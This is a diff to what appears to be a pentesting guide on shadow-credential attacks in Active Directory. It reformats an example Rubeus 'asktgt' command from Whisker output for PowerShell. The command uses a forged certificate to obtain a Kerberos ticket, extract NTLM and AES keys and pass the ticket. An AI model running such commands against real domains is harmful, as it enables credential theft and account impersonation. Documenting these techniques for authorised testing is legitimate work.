@@ -49,14 +49,17 @@ Whisker outputs a ready-to-use Rubeus command.
 Run the command **output by Whisker** (example):
 
 ```powershell
-Rubeus.exe asktgt ^
-    /user:TARGETUSER$ ^
-    /certificate:MII...[long base64]... ^
-    /password:"8V4wXTCFl3u4NT9I" ^        # Provided by Whisker
-    /domain:domain.local ^
-    /dc:dc.domain.local ^
-    /getcredentials ^                     # Extracts NTLM + AES keys
-    /ptt ^                                # Pass-The-Ticket
+# /password - Provided by Whisker
+# /getcredentials - Extracts NTLM + AES keys
+# /ptt - Pass-The-Ticket
+Rubeus.exe asktgt `
+    /user:TARGETUSER$ `
+    /certificate:MII...[long base64]... `
+    /password:"8V4wXTCFl3u4NT9I" `
+    /domain:domain.local `
+    /dc:dc.domain.local `
+    /getcredentials `
+    /ptt `
     /show
 ```
 
